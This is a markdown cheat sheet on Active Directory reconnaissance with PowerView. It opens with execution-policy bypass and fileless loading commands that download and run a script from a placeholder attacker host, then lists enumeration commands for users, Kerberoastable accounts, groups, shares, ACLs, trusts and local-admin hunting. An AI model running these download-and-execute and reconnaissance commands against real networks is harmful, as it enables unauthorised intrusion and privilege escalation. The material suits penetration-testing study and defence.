---
title: "Enumeration with PowerView"
---

## üõ°Ô∏è PowerShell Execution Policy Bypass

Allows running unsigned PowerShell scripts in the current process.

```powershell
powershell -ep bypass
```

Start a new PowerShell without profile restrictions.

```powershell
powershell.exe -ExecutionPolicy Bypass -NoProfile
```

Execute PowerView in memory (fileless execution).

```powershell
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/PowerView.ps1')"
```

---

## üì• Loading PowerView

Start temporary HTTP server on attacker machine.

```powershell
python3 -m http.server 80
```

Load PowerView directly into memory.

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/PowerView.ps1')
```

Download the script locally.

```powershell
Invoke-WebRequest http://ATTACKER-IP/PowerView.ps1 -OutFile PowerView.ps1
```

Import the module.

```powershell
Import-Module .\PowerView.ps1
```

Check which command naming exists.

```powershell
Get-Command *Domain*
```

```powershell
Get-Command *Net*
```

---

# üîç DOMAIN ENUMERATION

Get general domain information.

```powershell
Get-Domain
```

Retrieve the domain SID.

```powershell
Get-DomainSID
```

List domain policies.

```powershell
Get-DomainPolicy
```

Show password & lockout policy.

```powershell
(Get-DomainPolicy)."SystemAccess"
```

Show Kerberos configuration.

```powershell
(Get-DomainPolicy)."KerberosPolicy"
```

List domain controllers.

```powershell
Get-DomainController
```

**Legacy (old PowerView)**

Get general domain information.

```powershell
Get-NetDomain
```

Retrieve the domain SID.

```powershell
Get-NetDomainSID
```

List domain policies.

```powershell
Get-NetDomainPolicy
```

List domain controllers.

```powershell
Get-NetDomainController
```

---

# üë§ USER ENUMERATION

List domain users.

```powershell
Get-DomainUser
```

Detailed information about a user.

```powershell
Get-DomainUser -Identity <user> -Properties *
```

Find Kerberoastable accounts (SPN users).

```powershell
Get-DomainUser -SPN
```

Identify privileged/protected accounts.

```powershell
Get-DomainUser -AdminCount
```

Accounts trusted for delegation.

```powershell
Get-DomainUser -TrustedToAuth
```

Check logged-on users on a machine.

```powershell
Get-NetLoggedon -ComputerName <computer>
```

**Legacy (old PowerView)**

List domain users.

```powershell
Get-NetUser
```

Get specific user information.

```powershell
Get-NetUser -UserName <user>
```

Find Kerberoastable accounts.

```powershell
Get-NetUser -SPN
```

Find privileged accounts.

```powershell
Get-NetUser -AdminCount
```

---

# üíª COMPUTER ENUMERATION

List domain computers.

```powershell
Get-DomainComputer
```

Find servers only.

```powershell
Get-DomainComputer -OperatingSystem "*Server*"
```

Last logged-on user of a machine.

```powershell
Get-LastLoggedOn -ComputerName <computer>
```

**Legacy (old PowerView)**

List domain computers.

```powershell
Get-NetComputer
```

Find servers only.

```powershell
Get-NetComputer -OperatingSystem "*Server*"
```

---

# üë• GROUP ENUMERATION

List domain groups.

```powershell
Get-DomainGroup
```

Find administrative groups.

```powershell
Get-DomainGroup *admin*
```

List group members.

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

Find groups a user belongs to.

```powershell
Get-DomainGroup -UserName <user>
```

**Legacy (old PowerView)**

List domain groups.

```powershell
Get-NetGroup
```

List members of a group.

```powershell
Get-NetGroupMember -GroupName "Domain Admins"
```

---

# üìÇ SHARE ENUMERATION

Find domain shares.

```powershell
Find-DomainShare
```

Find accessible shares.

```powershell
Find-DomainShare -CheckShareAccess
```

**Legacy (old PowerView)**

Find network shares.

```powershell
Invoke-ShareFinder
```

Locate file servers in domain.

```powershell
Get-NetFileServer
```

---

# üßæ GPO ENUMERATION

List Group Policy Objects.

```powershell
Get-DomainGPO
```

GPO applied to a computer.

```powershell
Get-DomainGPO -ComputerName <computer>
```

Machines where GPO grants admin rights.

```powershell
Find-GPOComputerAdmin -ComputerName <computer>
```

Where a user has admin rights via GPO.

```powershell
Find-GPOLocation -Identity <user>
```

**Legacy (old PowerView)**

List Group Policy Objects.

```powershell
Get-NetGPO
```

---

# üè¢ OU ENUMERATION

List organizational units.

```powershell
Get-DomainOU
```

**Legacy (old PowerView)**

List organizational units.

```powershell
Get-NetOU
```

---

# üîê ACL ENUMERATION

View permissions on AD objects.

```powershell
Get-DomainObjectAcl -Identity <object> -ResolveGUIDs
```

Find privilege escalation paths.

```powershell
Invoke-ACLScanner -ResolveGUIDs
```

**Legacy (old PowerView)**

View permissions on AD objects.

```powershell
Get-ObjectAcl -SamAccountName <object>
```

---

# üîó TRUST ENUMERATION

Enumerate domain trusts.

```powershell
Get-DomainTrust
```

Map trust relationships.

```powershell
Get-DomainTrustMapping
```

**Legacy (old PowerView)**

Enumerate domain trusts.

```powershell
Get-NetDomainTrust
```

---

# üå≤ FOREST ENUMERATION

Get forest information.

```powershell
Get-Forest
```

List forest domains.

```powershell
Get-ForestDomain
```

List global catalog servers.

```powershell
Get-ForestGlobalCatalog
```

**Legacy (old PowerView)**

Get forest information.

```powershell
Get-NetForest
```

List forest domains.

```powershell
Get-NetForestDomain
```

---

# üéØ PRIVILEGE ESCALATION / HUNTING

Find machines where current user is local admin.

```powershell
Find-LocalAdminAccess
```

Find privileged sessions.

```powershell
Invoke-UserHunter
```

Enumerate local administrators across domain.

```powershell
Invoke-EnumerateLocalAdmin
```

Find unconstrained delegation systems.

```powershell
Get-DomainComputer -Unconstrained
```

**Legacy (old PowerView)**

Find unconstrained delegation systems.

```powershell
Get-NetComputer -Unconstrained
```